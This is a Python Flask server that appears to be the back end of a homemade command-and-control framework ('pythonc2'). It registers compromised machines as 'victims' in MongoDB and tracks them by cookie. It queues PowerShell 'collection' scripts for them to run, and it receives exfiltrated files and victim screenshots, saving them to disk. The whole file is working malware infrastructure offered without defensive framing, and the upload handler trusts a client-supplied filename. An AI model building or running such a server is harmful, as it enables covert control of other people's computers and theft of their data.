from flask import Flask,request
from pathlib import Path
import  os
import pymongo
import logging
import pdb
import base64
import datetime
import pdb
import time


def main(myclient):
	app = Flask('app')

	def get_cookie(request):
		d = request.cookies
		if d:
			return base64.b64decode(d.to_dict()['session']).decode()
		else:
			return False

	def update_last_seen(mydb,victim_id):
		victims = mydb["victims"]
		h = {'id':victim_id}
		victims.find_one_and_update(h,{ "$set": { "lastseen": datetime.datetime.now() } })


	def get_victim_info(request):
		return request.form.to_dict()

	def handle_commands(cmd_object):
		cmd = cmd_object['command']

		language = 'powershell'
		utility = 'collection'

		## Send command script to victim
		if language == 'python':
			module_path = os.path.join(os.getcwd(), "modules",language,utility,cmd+".py")
		else:
			module_path = os.path.join(os.getcwd(), "modules",language,utility,cmd+".ps1")

		f = open(module_path, "r")
		script = f.read()
		return {'cmd': cmd, 'language': language, 'script': script}
		


	@app.route('/',methods = ['GET', 'POST'])
	def run():
		if request.method == 'GET':
			mydb = myclient["pythonc2"]
			cmds = mydb["commands"]
			x = cmds.find_one()
			victim_id = get_cookie(request)


			if x:
				if 'sample' in x:
					cmds.delete_one(x)
					x = cmds.find_one()

				elif 'command' in x and x['victim_id'] == victim_id:
					# cmd = x['command']
					# cmds.delete_one(x)
					script = handle_commands(x)
					cmds.delete_one(x)
					return script

			if victim_id:
				update_last_seen(mydb,victim_id)

			return 'Nothing Fishy going on here :)'
		if request.method == 'POST':
			# data = request.json
			# import pdb
			# pdb.set_trace()

			print("Command to exfiltrate recieved...")
			if not os.path.exists('./exfiltration'):
				os.mkdir('./exfiltration')
			## wb enables to write bianry
			with open('./exfiltration/'+request.headers['Filename'], "wb") as f:
				# Write bytes to file
				f.write(request.data)
			f.close()
			return "OK"

	## Task output handler
	@app.route('/<cmd>/output',methods = ['POST'])
	def task_output(cmd):
		if request.method == 'POST':
			victim_id = get_cookie(request)

			if cmd == 'screenshot':
				dump_path = os.path.join(os.getcwd(),'victim_data',victim_id)
				if not os.path.exists(dump_path):
					os.makedirs(dump_path)
				
				## wb enables to write bianry
				with open(os.path.join(dump_path,"screenshot_"+time.strftime("%Y%m%d-%H%M%S")+".png"), "wb") as f:
					# Write bytes to file
					f.write(request.data)
				f.close()
			return "OK"

		

	@app.route('/stage_0',methods = ['POST'])
	def stage():
		if request.method == 'POST':
			mydb = myclient["pythonc2"]
			cmds = mydb["commands"]
			x = cmds.find_one()
			victim_id = get_cookie(request)
			victims = mydb['victims']
			info = get_victim_info(request)

		if victim_id:
			h = {'id':victim_id}
			h.update(info)

			if not victims.find_one(h):
				h['lastseen'] = datetime.datetime.now()
				victims.insert_one(h)
				return ('Victim registered', 200)
			else:
				return ('Victim already registered', 302)

		return ('Bad request', 400)

	app.run(host = '0.0.0.0', port = 8080)



if __name__=="__main__":
	myclient = pymongo.MongoClient("mongodb://localhost:27017/")
	main(myclient)